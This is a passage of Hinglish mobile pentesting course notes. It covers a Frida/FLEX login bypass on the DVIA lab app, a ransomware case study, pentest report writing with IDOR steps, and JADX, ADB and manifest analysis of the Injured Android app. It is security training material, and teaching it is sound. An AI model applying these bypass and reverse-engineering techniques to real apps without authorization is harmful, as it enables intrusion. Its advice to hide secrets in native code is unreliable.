            5.  App chalne lagegi. 💥
      * **Challenge 4: Runtime Manipulation (M4.1 / M4.3)**
          * **Task:** Login screen ko bina password ke bypass karo.
          * **Walkthrough (FLEXall):**
            1.  `FLEXall` (Cydia tweak) install aur enable karo.
            2.  DVIA app kholo, Login screen par jaao.
            3.  `FLEX` toolbar se 'Select' tool lo aur 'Login' button ko tap karo.
            4.  `FLEX` mein dekho ki button kis 'View Controller' (e.g., `LoginViewController`) mein hai.
            5.  `FLEX` ke 'Heap' (memory) section mein `LoginViewController` ko search karo.
            6.  Uske methods (functions) ko dekho. Aapko `(BOOL)isLoginSuccessful` jaisa method dikhega.
            7.  Use (FLEX se hi) "call" karo aur `true` set kar do... Ya (Frida se) hook karke `true` return karwa do.
            8.  Login bypass ho jaayega. 💥

7.  **🌍 Real-World Attack Scenario (The "How-To-Hack"):**

      * **🕵️‍♂️ Pentesting Scenario (Ethical Hacker):** Yahi DVIA/iGoat ke challenges hi real-world iOS pentest scenarios hain.

8.  **✅ Quick checklist / Mitigation:**

      * Har challenge ko pehle khud try karo.
      * `Filza`, `SSH`, `Objection`, `FLEXall` ka bharpoor istemaal karo.
      * (iGoat, ek aur lab hai, usmein Swift par zyada focus hai).

9.  **🏋️‍♀️ Practice exercise (Lab):**

      * DVIA (v1 ya v2) ka `.ipa` download karo.
      * Use jailbroken phone par (Sideloadly/Filza se) install karo.
      * Uske saare challenges ko solve karne ki koshish karo.

10. **📚 Further reading / commands / tools:**

      * **Tools:** `Filza`, `SSH`, `Objection`, `Frida`, `FLEXall`, `Keychain_dumper`.
      * **Lab:** `DVIA (Damn Vulnerable iOS App)`, `iGoat` (Swift).

-----

## 8.3: Case Study: SimpleLocker Ransomware

1.  **🎯 Title / Short Summary:** Case Study: Ek Asli Malware (SimpleLocker) 💀.

2.  **🤔 Kya hai? (What?):** SimpleLocker ek Android "Ransomware" (firauti maangne wala virus) tha. Yeh phone ki saari files (photos, documents) ko 'encrypt' (lock) kar deta tha aur unhe waapas dene ke badle paise (Bitcoin) maangta tha.

3.  **💡 Kyu important hai? (Why?):** Yeh case study humein (pentesters ko) sikhaati hai ki attacker "Android components" ka galat istemaal kaise karte hain. Yeh dikhaata hai ki M5 mein seekhi vulnerabilities (Insecure Storage, Permissions) ka real-world impact kitna destructive ho sakta hai.

4.  **⏰ Kab/Kahan check karein? (When/Where?):** Jab humein yeh samajhna ho ki "Malware Analysis" (pentesting ka ek hissa) kaise hota hai aur attacker kaise sochte hain.

5.  **🧑‍🏫 Step-by-step explanation / Malware ka Logic (Reverse Engineered):**

      * **Step 1: Infection (Phailna):** Yeh ek "Fake Flash Player" app bankar user ke phone mein install hota tha (Sideloading).
      * **Step 2: Persistence (Jam jaana):** Install hote hi, yeh `BOOT_COMPLETED` permission (Manifest se) ka use karke register ho jaata tha. (Matlab: Phone restart hone par yeh *khud* start ho jaayega).
      * **Step 3: Device Admin (Control):** Yeh user ko 'Device Administrator' access (jo 'Find My Phone' use karta hai) dene ke liye popup dikhaata tha. Agar user "Allow" kar deta, toh ab malware ko *uninstall* karna namumkin ho jaata tha.
      * **Step 4: Encryption (Lock karna):** Malware, `READ_EXTERNAL_STORAGE` permission (M2.3) ka use karke SD card ki saari `.jpg`, `.mp4`, `.pdf` files ko AES encryption se lock kar deta tha.
      * **Step 5: Ransom (Firauti):** Malware, `WebView` (M5.4) ka istemaal karke ek full-screen ransom note (jo Tor network se aata tha) dikhaata tha. "Aapki files lock ho gayi hain. Bitcoin bhejo."
      * **Step 6: C2 Server:** Malware, attacker ke Command & Control (C2) server se `HTTP` (M2.5) par (plain text mein) encrypted key bhejta tha (jisse use baad mein decrypt karna tha).
      * **Nateeja:** User ki saari files lock, app uninstall nahi ho rahi, aur phone restart karne par bhi lock screen waapas aa jaati thi.

6.  **🌍 Real-World Attack Scenario (The "How-To-Hack"):**

      * **🕵️‍♂️ Pentesting Scenario (Ethical Hacker / Malware Analyst):**
        1.  Analyst, `.apk` ko `JADX` (M3.2) mein kholta hai.
        2.  `AndroidManifest.xml` (M2.1) padhta hai: `BOOT_COMPLETED`, `READ_EXTERNAL_STORAGE`, `DEVICE_ADMINISTRATOR` permissions dekhta hai. (Samajh jaata hai ki yeh khatarnaak hai).
        3.  `JADX` mein code (M3.2) padhta hai: `AESEncryption.java` file dekhta hai. Samajh jaata hai ki yeh file encryption kar raha hai.
        4.  `Burp` (M2.4) se traffic dekhta hai: `HTTP` (plain text) mein C2 server ko request jaate dekhta hai jismein encryption key hai.
        5.  **Mitigation:** Analyst us C2 server ko (traffic se) dhoondh kar block karwata hai, aur (code se) AES key nikaal kar "Decryption Tool" banata hai.

7.  **✅ Quick checklist / Mitigation (Humne kya seekha):**

      * **Android Permissions** (M2.3) bahut powerful hain. (Flashlight ko Storage kyun chahiye?).
      * **Device Admin API** bahut khatarnaak hai.
      * **Hardcoded keys** (M3.2) (agar malware mein hoti) se use reverse karna aasan ho jaata hai.
      * **HTTP traffic** (M2.5) (Lack of Pinning) se attacker ka server (C2) pakda jaata hai.

8.  **📚 Further reading / commands / tools:**

      * **Tools:** `JADX-GUI`, `Burp Suite`.
      * **Concepts:** `Ransomware`, `Device Administrator API`, `BOOT_COMPLETED` (Persistence).

-----

## 8.4: Writing Actionable Pentest Reports

1.  **🎯 Title / Short Summary:** Kaam Ki Report Likhna (Reporting) 📄.

2.  **🤔 Kya hai? (What?):** Yeh pentesting ka sabse *zaroori* (aur aksar ignore kiya jaane wala) skill hai. Aapne jo bhi bugs (M5, M6) dhoondhe hain, unhe ek professional PDF report mein likhna, jise **Manager (Executive)** aur **Developer (Technical)** dono samajh sakein.

3.  **💡 Kyu important hai? (Why?):** Agar aapne P1 Critical IDOR (M6.1) dhoondh liya, lekin aap use report mein *samjha* hi nahi paaye, toh developer use fix nahi kar paayega aur manager uske risk ko nahi samajh paayega. **Aapki report hi aapka "final product" hai.** Isi ke paise milte hain.

4.  **⏰ Kab/Kahan check karein? (When/Where?):** Saari testing (M1-M7) complete karne ke *baad*.

5.  **❌ Agar check nahi kiya to kya hoga? (If not checked / consequences):** Aapki saari mehnat (hacking) bekaar ho jaayegi. Client (jise bug samajh nahi aaya) aapko "unprofessional" samjhega aur dobara kaam nahi dega. Bug bounty report "Not Applicable" / "Duplicate" / "Informative" mark ho jaayegi.

6.  **🧑‍🏫 Step-by-step explanation / Ek Achhi Report ka Structure:**

      * **1. Executive Summary (Manager ke liye):**
          * **Goal:** 1 page, simple English, no technical jargon.
          * **Content:** "Humne 5 din test kiya. Hamein 2 'Critical', 3 'High', aur 5 'Medium' bugs mile. Sabse bada risk (Critical) yeh hai ki koi bhi attacker doosre user ka data (IDOR) chura sakta hai. (Aage details hain)."
      * **2. Methodology (Method):**
          * **Goal:** Batana ki aapne kya kiya.
          * **Content:** "Humne Static Analysis (JADX, Ghidra) aur Dynamic Analysis (Burp, Frida) dono kiya. Humne OWASP Mobile Top 10 (2016) ko follow kiya."
      * **3. Findings (Developer ke liye) (Sabse Zaroori):**
          * Har bug (e.g., IDOR) ke liye 5 cheezein:
          * **a. Title:** Saaf-saaf. (e.g., "IDOR (Broken Object Level Authorization) on /api/users/\<id\> allows any user to view other users' PII").
          * **b. Severity:** Critical / High / Medium / Low (CVSS Score use karke, e.g., 9.8 Critical).
          * **c. Steps-to-Reproduce (StR) (IMPORTANT):**
              * Bilkul "bachhe" ki tarah samjhao.
              * Step 1: Login as `attacker@test.com`.
              * Step 2: Capture `GET /api/users/123` (attacker's profile) in Burp.
              * Step 3: Send to Repeater.
              * Step 4: Change URL to `GET /api/users/124` (victim's ID).
              * Step 5: Send request.
              * Step 6: **Observe:** Server `200 OK` deta hai aur victim (`user 124`) ka email/phone response mein aa jaata hai.
          * **d. Impact (Business Risk):** Yahan 'kya' hota hai, woh likho. (e.g., "Is vulnerability se attacker company ke *saare* users ka PII (email, phone, address) chura sakta hai, jisse GDPR/Data Breach ka P1 risk hai.")
          * **e. Mitigation / Recommendation (Fix):**
              * *Nuksaan* mat batao, *ilaaj* batao.
              * (Secure code example M6.1 se) "Server par, API endpoint ko check karna chahiye ki request karne waale user (token se) ki ID, data maangne waali ID (`<id>`) se match karti hai ya nahi. (`if (token.userId == params.id)`)."
      * **4. Conclusion (Aakhir mein):**
          * "App ki security 'average' hai. Critical IDOR aur Firebase bugs ko turant fix karna chahiye."

7.  **🐞 Common beginner mistakes (Emphasis):**

      * **Report na likhna:** Sirf "IDOR mil gaya" bol dena.
      * **Vague (Adhoora) Title:** "Bug in API". (Kaun sa bug? Kahan?).
      * **Weak Steps-to-Reproduce:** "ID badlo, bug mil jaayega." (Kaise badloon? Kahan badloon? Token kiska?). Aapke StR itne clear hone chahiye ki developer (jo 2 baje raat ko jaaga hai) bhi use follow karke bug dekh sake.
      * **Impact (Risk) na batana:** "IDOR hai." (Toh kya? Isse company ko kya nuksaan hai? "Data Breach" -\> yeh hai impact).
      * **Mitigation (Fix) na batana:** "Bug hai, fix karo." (Kaise fix karoon? Aapko "Parameterized queries use karo" ya "Token role check karo" jaisa *solution* dena hai).

8.  **🌍 Real-World Attack Scenario (The "How-To-Hack"):**

      * **🕵️‍♂️ Pentesting Scenario (Ethical Hacker):** Aapka kaam bug dhoondhna (50%) aur use achhe se report karna (50%) hai. Achhi report = Happy client = Zyada paise.
      * **💰 Real Bug Bounty Example:** HackerOne/Bugcrowd par, report ki 'quality' (StR, Impact) par hi aapki bounty (paisa) aur reputation (izzat) depend karti hai. Vague report = Duplicate / N/A. Clear report = P1 Bounty.

9.  **✅ Quick checklist / Mitigation:**

      * **Manager ke liye:** Executive Summary (Simple).
      * **Developer ke liye:** Title, Severity, *Clear Steps-to-Reproduce*, Impact (Business Risk), Mitigation (Solution).
      * **Proof:** Har bug ke saath **screenshots** (Burp request/response) zaroor daalo.

10. **🏋️‍♀️ Practice exercise (Lab):**

      * DIVA ka (M8.1) "Insecure Data Storage" bug lo.
      * Uske liye ek 'Finding' (Sirf 1 bug) likho: Title, Severity (High), StR (adb shell waale commands), Impact (Koi bhi rooted phone wala app data chura sakta hai), Mitigation (Use Keystore).

11. **📚 Further reading / commands / tools:**

      * **Tools:** `Word`/`Pages` (Report likhne ke liye), `CVSS v3.1 Calculator` (Severity nikaalne ke liye).
      * **Templates:** HackerOne/Bugcrowd ki "Good Vulnerability Report" examples online dekho.

-----

## 8.5: Automating Security in CI/CD (Lec 26)

  * **🎯 Title / Short Summary:** Security ko Automatic karna (DevSecOps) 🤖.
  * **🤔 Kya hai? (What?):** CI/CD (Continuous Integration / Continuous Deployment) woh pipeline hai jisse code (Dev) aur operations (Ops) milkar app ko fast banate aur update karte hain. **DevSecOps** ka matlab hai is pipeline mein "Security" (Sec) ko bhi jod dena.
  * **💡 Kyu important hai? (Why?):** Hum (pentester) saal mein ek baar (manual) test karte hain. Developers *har roz* 10 baar code badalte hain. Automatic scanner (jaise `MobSF`) ko CI/CD pipeline mein daalne se, har naya code *build* hote hi 'basic' security flaws (jaise hardcoded key) ke liye automatic check ho jaata hai (bug aane se pehle hi pakda jaata hai).
  * **🧑‍🏫 Step-by-step explanation:**
    1.  Developer code `git push` karta hai.
    2.  CI Pipeline (jaise Jenkins/GitLab) trigger hota hai.
    3.  Step 1: Code compile hota hai.
    4.  Step 2: App (`.apk`) build hoti hai.
    5.  **Step 3 (DevSecOps):** Pipeline *automatic* `MobSF` (ya `SonarQube`) ko call karta hai aur `.apk` ko scan ke liye bhejta hai.
    6.  Step 4: `MobSF` scan karta hai. Agar "Critical" (jaise hardcoded key) milta hai, toh MobSF pipeline ko "FAIL" kar deta hai.
    7.  Nateeja: Vulnerable code production (App Store) tak *pahunchta hi nahi*.
  * **🌍 Real-World Scenario:** Hum (pentesters) in tools ko setup karne mein help karte hain (consulting) aur 'false positives' ko tune karte hain.
  * **✅ Quick checklist:**
      * **SAST (Static):** `MobSF`, `SonarQube` (code scan).
      * **DAST (Dynamic):** `OWASP ZAP` (API scan).
      * **Goal:** "Shift-Left" (Security ko process mein shuru mein hi le aana).

-----

## 8.6: Career & Bug Bounty Strategy

1.  **🎯 Title / Short Summary:** Hacking se Paise/Job kaise kamaayein 💰👨‍💻.

2.  **🤔 Kya hai? (What?):** Aapne M1-M8 seekh liya. Ab is skill ko 'monetize' (paisa) ya 'career' (job) mein kaise badlein.

3.  **💡 Kyu important hai? (Why?):** Skill (bina apply kiye) bekaar hai. Yeh aakhri step hai.

4.  **🧑‍🏫 Step-by-step explanation / Strategy:**

      * **Strategy 1: Bug Bounty (The Hacker Way)**
          * **Platform:** `HackerOne` (H1), `Bugcrowd` (BC) par account banao.
          * **Finding Targets (Shuruaat):**
              * **VDP (Vulnerability Disclosure Program):** Yeh 'no bounty' (paisa nahi) waale program hote hain. (e.g., Google, Microsoft). Yahan (paisa nahi) 'Reputation' (izzat) milti hai.
              * **Shuruaat yahan se kyun?** Badi companies (jaise Google) aapki (M8.4) report ko achhe se padhengi aur 'feedback' dengi. Aapki report quality sudhregi. 10-15 'Thanks' (points) milne ke baad aapki profile strong ho jaayegi.
              * **Public (Paid) Program:** VDP ke baad, 'paid' (paisa) waale program try karo.
          * **Strategy:**
              * **Wide (Fail):** 100 apps par 1 din (M5.1) try karna. (Sabko IDOR/XSS milega).
              * **Deep (Success):** *1 app* par 10 din (M1-M8 poora) test karna. Uske M6 (Logic Flaws), M7 (React Native), M3 (Ghidra) ko reverse karke "unique" bug dhoondhna jo baaki 100 log nahi dhoondh rahe.
          * **Responsible Disclosure:** Bug milte hi "Tweet" (dhindhora) mat karo. Use platform (H1/BC) ke through *sirf* company ko batao. Fix hone ka wait karo.
      * **Strategy 2: Penetration Tester (The Job Way)**
          * **Resume:** Apne resume mein "Skills" ke andar yeh sab daalo: `Frida`, `Ghidra`, `Burp Suite`, `Objection`, `MobSF`, `JADX`, `ADB`, `OWASP Mobile Top 10`, `API Hacking (IDOR, BOLA, SSRF)`.
          * **Practice:** DIVA / DVIA (M8.1, 8.2) ko poora solve karo.
          * **Portfolio (Proof):**
              * Ek blog (Medium/WordPress) banao.
              * Jo DIVA/DVIA ke challenges solve kiye, unka "Walkthrough" (M8.4 jaisa) likho.
              * (Agar VDP kiya hai) Us bug ki (fix hone ke baad) report (agar public hai) share karo.
          * **Certifications (Optional):** `eMAPT` (eLearnSecurity) mobile ke liye achha hai, lekin `OSCP` (Offensive Security) overall best (par mobile specific nahi) hai.
          * **Interview:** Interview mein aapse M6 (IDOR/BOLA kya hai?) aur M4 (Frida se root bypass kaise karoge?) zaroor poochha jaayega.

5.  **🐞 Common beginner mistakes (Emphasis):**

      * **Bug Bounty:** Pehle din hi `Google` / `Facebook` (jahan lakho log hain) par bug dhoondhna. (Aapko 'Duplicate' hi milega). Naye/VDP program se shuru karo.
      * **Job:** Resume mein sirf "Ethical Hacking" likhna. (Yeh vague hai. "Frida" / "Burp" / "API Hacking" jaise *keywords* likho).
      * **Report:** M8.4 waali galti karna (achhi report na likhna).

6.  **✅ Quick checklist / Mitigation:**

      * **Bounty:** VDP (Reputation) -\> Paid (Money). Go Deep, not Wide.
      * **Job:** Resume (Keywords) + Portfolio (Blog/Walkthroughs) + Practice (DIVA/DVIA).
      * **Golden Rule:** Report writing (M8.4) mein master bano.

7.  **🏋️‍♀️ Practice exercise (Lab):**

      * HackerOne par 'VDP' (non-paid) program dhoondho (jinke paas Android/iOS app ho).
      * Unki app par (M1-M7) 2 din test karo aur (agar bug mile) M8.4 ke format mein report submit karo.

-----

Module 8 (aur aapka poora course) complete\! 🏁🏆

Badhaai ho\! 🥳 Aapne 'Zero-to-Hero' tak ka safar poora kar liya hai. Aapne lab setup, reversing, Frida, API hacking, cross-platform, aur reporting... sab seekh liya hai.

Ab aapka 'real' safar (Practice) shuru hota hai. DIVA, DVIA, aur Bug Bounty VDPs aapke naye dost hain. Keep hacking\! 🧑‍💻

=============================================================

### TCM MOBILE APPLICATION PENETRATION TESTING COURSE



## Phase 1: Android Lab Setup & Static Analysis Basics

---

### 🎯 1. Title / Topic: **Module 4.1 – JADX-GUI: The Source Code Unlocker**

#### Beginner Clarification
- Java check command: java -version.
- Installed case me version lines dikhti hain, jaise openjdk version 11.x.
- Not installed case me java is not recognized type error aata hai.
- JADX run karne ke liye Java 8+ required hai.

#### 🐣 2. Samjhane ke liye (Simple Analogy)
JADX-GUI ko ek "chef's recipe decoder" ki tarah samjho. Maan lo tumhare paas ek tasty dish (APK) hai, lekin uski recipe (source code) nahi pata. JADX-GUI wo magical machine hai jo dish ko chakh kar uski poori recipe – ingredients, steps, sab kuch – nikal deta hai. Ab tum dekh sakte ho ki dish mein kaunsa secret masala (hardcoded key) dala hai ya kaunsa step galat hai (vulnerability).

#### 📖 3. Technical Definition (Interview Answer)
JADX-GUI ek open-source decompiler hai jo Android application package (APK) files ko readable Java source code mein convert karta hai. Ye DEX (Dalvik Executable) bytecode ko reverse engineer karke `.java` files produce karta hai, jisse static analysis ke dauran app ke logic, permissions, aur vulnerabilities ko samajhna aasan ho jata hai.

#### 🧠 4. Zaroorat Kyun Hai? (Why Attack/Secure this?)
- **Vulnerability (Hacker’s View):** Hacker JADX ka use karke app ke source code mein chhipe hardcoded credentials (API keys, passwords), insecure API calls, ya exposed components dhundh sakta hai. Inka exploitation directly data leak ya unauthorized access de sakta hai.
- **Security (Developer’s View):** Developers apne app ko deploy karne se pehle JADX se decompile karke check kar sakte hain ki koi sensitive information accidently leak toh nahi ho rahi. Jaise ki “Arey! maine to key native code mein daali thi, lekin yahan kaise dikh rahi hai?”

#### ⚙️ 5. Under the Hood (Technical Working) & Target Anatomy
- **Architecture:** Android apps compile hokar APK banate hain. APK andar se ek ZIP archive hota hai. JADX sabse pehle `classes.dex` file ko parse karta hai – ye file Dalvik bytecode mein hoti hai. Phir ye bytecode ko Java bytecode mein convert karta hai aur usse Java source code mein decompile karta hai.
- **📂 Target Anatomy Deep Dive:**
  - **File:** `classes.dex`
  - **Ye file kyun hai? (Purpose):** App ka executable code (bytecode) store karta hai. Android Runtime (ART) ise run karta hai.
  - **Hacker isme kya dhundta hai? (Attacker View):** Hardcoded strings, logic flaws, API endpoints, encryption algorithms.
  - **Agar manipulate kiya toh kya hoga? (Consequence):** Agar hacker DEX file modify kare (smali editing) aur app repack kare, to app ka behavior change ho sakta hai – jaise premium features unlock.
  - **Under the hood:** Android OS Zygote process se app fork karta hai aur ART DEX bytecode ko ahead-of-time (AOT) ya just-in-time (JIT) compile karke machine code mein convert karta hai.

#### 💻 6. Hands-On: The Hacker's Toolkit
**Step-by-Step JADX-GUI Installation (Windows):**
1. **Java Install Check:** Open Command Prompt and type `java -version`. Agar Java installed nahi hai, toh [Oracle JDK](https://www.oracle.com/java/technologies/javase-downloads.html) download karo.
2. **Download JADX-GUI:** 
   - GitHub par jao: [https://github.com/skylot/jadx](https://github.com/skylot/jadx)
   - "Releases" section mein jao.
   - Windows ke liye `jadx-gui-<version>-with-jre-win.exe` download karo (isme JRE bundled hai, alag Java install na ho to bhi chalega).
3. **Run JADX-GUI:** Downloaded exe par double-click karo. GUI open hoga.
4. **Open APK:** File → Open → koi bhi APK select karo (e.g., Injured Android App jo hum next step mein pull karenge). Ab source code browse karo.

#### ⚖️ 7. Comparison (Ye vs Woh) & Tool Wars
- **JADX vs APKTool:**
  - **JADX:** Java source code deta hai. Easy to read logic.
  - **APKTool:** Resources (layouts, images) aur Smali code (assembly-like) deta hai. Modification ke liye useful.
  - **When to use?** JADX for understanding logic; APKTool for patching/modding.

#### 🚫 8. Common Mistakes (Beginner Traps)
- **Java version mismatch:** JADX latest version requires Java 8 or higher. Purana Java hai to error aayega.
- **Wrong file opening:** Kuch log APK nahi, koi aur file khol dete hain. Ensure file extension `.apk` hai.
- **Bina permission ke app decompile karna:** Legal warning – sirf apne apps ya authorized targets par test karo.

#### 🌍 9. Real-World Use Case (Exploit Examples)
2019 mein ek famous fitness app mein hardcoded AWS keys thi jo JADX se decompile karke mil gayi. Hacker ne un keys se user data access kar liya. Company ko data breach ka samna karna pada.

#### 🎨 10. Visual Diagram (ASCII Art)
```
+--------+     +-----------+     +------------+
|  APK   | --> | JADX-GUI  | --> | Java Source|
| (.dex) |     | Decompiler|     |   Code     |
+--------+     +-----------+     +------------+
```

#### 🛠️ 11. Best Practices (Remediation)
- **For Pentesters:** Hamesha latest version use karo. Decompile karne ke baad sensitive info ke liye search karo (e.g., "password", "api_key").
- **For Developers:** Use obfuscation tools like ProGuard/R8 to make decompiled code harder to read. Store secrets in native code or secure backend.

#### ⚠️ 12. Consequences of Failure (Risk Analysis)
- **Technical Impact:** Hardcoded secrets leak ho sakte hain → data breach, account takeover.
- **Business Impact:** Reputation loss, financial penalties (GDPR, PCI-DSS).

#### ❓ 13. FAQ (Interview Questions)
1. **Q:** JADX aur APKTool mein kya antar hai?
   **A:** JADX source code (Java) deta hai, APKTool resources aur Smali deta hai. JADX analysis ke liye, APKTool modification ke liye.
2. **Q:** Kya JADX se hamesha perfect source code milta hai?
   **A:** Nahin, obfuscation ya complex code ke case mein output imperfect ho sakta hai, lekin logic samajhne ke liye kaafi hai.
3. **Q:** JADX ke alternative kaun se tools hain?
   **A:** Bytecode Viewer, CFR, Fernflower (IntelliJ ke andar).
4. **Q:** Kya JADX iOS apps ke liye bhi kaam karta hai?
   **A:** Nahi, ye sirf Android DEX ke liye hai. iOS ke liye use Hopper, Ghidra.

#### 📝 14. Summary (One Liner)
**JADX-GUI – APK ka “X-Ray” jo source code ki haddiyan dikhata hai!** 🦴

---

### 🎯 1. Title / Topic: **Module 5.1 – Target App Download: Injured Android App**

#### 🐣 2. Samjhane ke liye (Simple Analogy)
Jaise driving seekhne ke liye ek purani gaadi chahiye, waise hi mobile pentesting seekhne ke liye ek “buri” app chahiye jo vulnerabilities se bhari ho. **Injured Android App** wahi “training gaadi” hai – deliberately vulnerable banayi gayi hai taaki hum uspe apne hacking skills try kar sakein.

#### 📖 3. Technical Definition
Injured Android App ek open-source vulnerable Android application hai jise intentionally insecure banaya gaya hai. Isme OWASP Mobile Top 10 vulnerabilities implement ki gayi hain, jisse beginners practical hacking seekh sakte hain.

#### 🧠 4. Zaroorat Kyun Hai?
- **Vulnerability:** Ye app seekhne ke liye hai, isliye isme bugs hain. Hacker (student) yahan practice karta hai.
- **Security:** Developers ke liye ye ek safe practice ground hai jahan real apps ko risk daale bina testing seekhi ja sakti hai.

#### ⚙️ 5. Under the Hood
App intentionally weak code likha gaya hai, jaise hardcoded credentials, insecure storage, exported activities. Hum static aur dynamic analysis inhi weaknesses ko dhundhna seekhenge.

#### 💻 6. Hands-On: The Hacker's Toolkit
**Steps to download from Play Store:**
1. Apne Android device par Google Play Store open karo.
2. Search karo **"Injured Android App"** (developer: B3nac).
3. Install karo.
4. App launch karo aur explore karo.

#### ⚖️ 7. Comparison
- **Injured App vs Other Vulnerable Apps:** Jaise Damn Vulnerable Bank, AndroGoat. Sabka apna focus hai. Injured me flags capture karne ka game jaisa hai, interesting.

#### 🚫 8. Common Mistakes
- Bhoolna ki app sirf learning ke liye hai. Isko production app samajh kar report mat likh dena.
- Play Store par kai fake apps ho sakti hain sahi naam se. Ensure karo developer **B3nac** hai.

#### 🌍 9. Real-World Use Case
Kai bug bounty hunters pehle vulnerable apps practice karte hain phir real targets par jaate hain.

#### 🛠️ 11. Best Practices
- Practice ke baad app uninstall kar do.
- Emulator mein bhi chal sakti hai.

#### 📝 14. Summary
**Injured Android App – hamari “training dojo” jahan hum apne pentesting weapons test karte hain.** 🥋

---

### 🎯 1. Title / Topic: **Module 5.2 – Pulling APK from Device via ADB**

#### Beginner Clarification
- Agar adb devices empty aaye ya unauthorized aaye to USB driver issue ho sakta hai.
- Windows me Device Manager se manufacturer USB driver update karo.
- Package filter differences:
  - Windows CMD: adb shell pm list packages | findstr injured
  - Linux/Mac: adb shell pm list packages | grep injured
  - PowerShell: adb shell pm list packages | Select-String injured
- Split APK case me base.apk ke saath split files bhi aa sakti hain; full app folder pull karna better hota hai.

#### 🐣 2. Samjhane ke liye (Simple Analogy)
Maan lo tumhare paas ek locked box (device) hai jisme ek gift (app) hai. Tum gift ko nikal kar dekhna chahte ho. ADB wo chabi hai jo box kholti hai aur gift ko bahar nikal kar PC par rakh deti hai. Yahan gift APK file hai.

#### 📖 3. Technical Definition
ADB (Android Debug Bridge) ek versatile command-line tool hai jo Android device ke saath communicate karta hai. `adb pull` command se hum device se files (like APK) ko local machine par copy kar sakte hain.

#### 🧠 4. Zaroorat Kyun Hai?
- **Vulnerability:** Agar app store se download karna possible na ho (e.g., region locked), ya system app ka APK chahiye, toh ADB se pull karna padta hai.
- **Security:** Kisi app ka APK lekar hum uski static analysis kar sakte hain bina app run kiye.

#### ⚙️ 5. Under the Hood & Target Anatomy
- **File:** APK installed apps ka location: `/data/app/<package-name>-<random>/base.apk`
- **Ye file kyun hai?** Installed app ka main executable.
- **Hacker kya dhundhta hai?** APK ko PC par le jake decompile karna.
- **Consequence of manipulation:** APK modify karke repack kar sakte hain (trojan version).
- **Under the hood:** Android app installation ke time APK ko `/data/app` mein copy karta hai aur extract karta hai.

#### 💻 6. Hands-On: The Hacker's Toolkit
**Step-by-step ADB Pull:**
1. **Enable Developer Options & USB Debugging:**
   - Settings → About Phone → Build Number par 7 baar tap karo.
   - Settings → Developer Options → USB Debugging enable karo.
2. **Connect device to PC** via USB. (Allow USB debugging popup on device)
3. **Verify device:** `adb devices` → device serial number dikhna chahiye.
4. **Find package name:** `adb shell pm list packages` (scroll ya grep use karo, e.g., `adb shell pm list packages | findstr injured`).
5. **Get APK path:** `adb shell pm path com.b3nac.injuredandroid`
   - Output: `package:/data/app/com.b3nac.injuredandroid-xxx/base.apk`
6. **Pull APK:** `adb pull /data/app/com.b3nac.injuredandroid-xxx/base.apk C:\Users\YourName\Desktop\injured.apk`
7. **Verify:** File destination par check karo.

#### ⚖️ 7. Command Comparison: Pull vs Push
- **`adb pull <device-file> <pc-destination>`:** Device se PC par file copy karna.
- **`adb push <pc-file> <device-destination>`:** PC se device par file copy karna.
- **Kab use karna?** Pull for extracting APK/logs; Push for transferring custom files (like patched APK).

#### 🚫 8. Common Mistakes
- **USB Debugging enable nahi kiya:** `adb devices` empty dikhayega.
- **Wrong path:** Package path mein random suffix hota hai, exact path `pm path` se lo.
- **Permission denied:** Kuch system apps ke APK ko pull karne ke liye root chahiye.

#### 🌍 9. Real-World Use Case
Pentester ko ek app mili jo store par available nahi thi (in-house app). Usne device se APK pull kiya, decompile kiya, aur hardcoded admin credentials dhundh liye.

#### 🛠️ 11. Best Practices
- Hamesha backup APK rakh lo.
- Production devices par bina permission ADP pull mat karo – ethical boundary.

#### ⚠️ 12. Consequences of Failure
- **If you can't pull APK:** Static analysis possible nahi, sirf dynamic par depend rahna padega.
- **Business Impact:** Koi bhi APK easily leak ho sakti hai agar attacker ke paas device access ho.

#### ❓ 13. FAQ
1. **Q:** `adb pull` aur `adb install` mein kya antar hai?
   **A:** `pull` device se PC par file lata hai; `install` PC se device par app install karta hai.
2. **Q:** Bina root ke system app ka APK pull kar sakte hain?
   **A:** Usually nahi, `/system` partition read-only hota hai. Root required.
3. **Q:** `adb shell pm path` se multiple base.apk mile to?
   **A:** Kuch apps split APKs use karte hain. Sabhi pull karo aur analysis ke time merge karo.

#### 📝 14. Summary
**ADB pull – device se APK chura kar PC par analysis karne ka raaz!** 🕵️

---

### 🎯 1. Title / Topic: **Module 5.3 – AndroidManifest.xml: The Blueprint of the App**

#### Beginner Clarification
- android:exported=true ka meaning component-wise alag risk deta hai.
- Activity exported ho to direct launch possible.
- Service exported ho to external start or bind abuse possible.
- Receiver exported ho to malicious broadcast injection possible.
- Provider exported ho to external read or write leak risk badhta hai.

#### 🐣 2. Samjhane ke liye (Simple Analogy)
AndroidManifest.xml ek building ka "master plan" hota hai. Jaise blueprint mein pata hota hai ki building mein kitne kamre (Activities) hain, kaunsa darwaza bahar ki taraf khulta hai (exported), kaun si services (electricity, water) connected hain, waise hi manifest mein app ke components, permissions, aur entry points ki detail hoti hai.

#### 📖 3. Technical Definition
AndroidManifest.xml har Android app ki root directory mein present ek mandatory file hai. Ye app ke baare mein essential information provide karti hai – package name, components (activities, services, broadcast receivers, content providers), permissions, hardware/software features, etc. Android OS is file ko read karke app ko run karne ka tarika samajhta hai.

#### 🧠 4. Zaroorat Kyun Hai?
- **Vulnerability:** Hacker manifest mein exported components dhundhta hai jo bina permission ke dusre apps ya ADB se launch kiye ja sakte hain. Isse sensitive activities bypass ho sakti hain.
- **Security:** Developer manifest mein `exported="false"` set karta hai taaki component sirf app ke andar accessible ho.

#### ⚙️ 5. Under the Hood & Target Anatomy
**File:** `AndroidManifest.xml` (binary XML form me APK mein)
- **Purpose:** Android system ko batata hai ki app kaun se components rakhti hai, kaise interact karegi, aur kya permissions chahiye.
- **Hacker kya dhundhta hai?**
  - `android:exported="true"` components.
  - Custom permissions jo weak hain.
  - Backup flag (`android:allowBackup="true"`) – isse app data backup ho sakta hai.
  - Debuggable flag.
- **Consequence of manipulation:** Agar manifest modify karein (repack) toh app ke behavior change kar sakte hain, jaise exported activities ko enable karna.
- **Under the hood:** PackageManager service manifest ko parse karti hai aur component access control enforce karti hai.

#### 💻 6. Hands-On: The Hacker's Toolkit
**Steps to analyze AndroidManifest.xml:**
1. APK ko JADX-GUI mein open karo.
2. Left panel mein `AndroidManifest.xml` par click karo.
3. Search karo:
   - `exported="true"` – potential entry points.
   - `permission` – custom permissions.
   - `allowBackup` – true hai to data backup vulnerability.
   - `debuggable` – true hai to debugging allowed.
4. Example: Injured Android App mein `android:exported="true"` activities dhundho.

#### ⚖️ 7. Comparison: Exported vs Non-exported
- **Exported (true):** Bahar se access allowed. Jab tak proper permission na ho, risky.
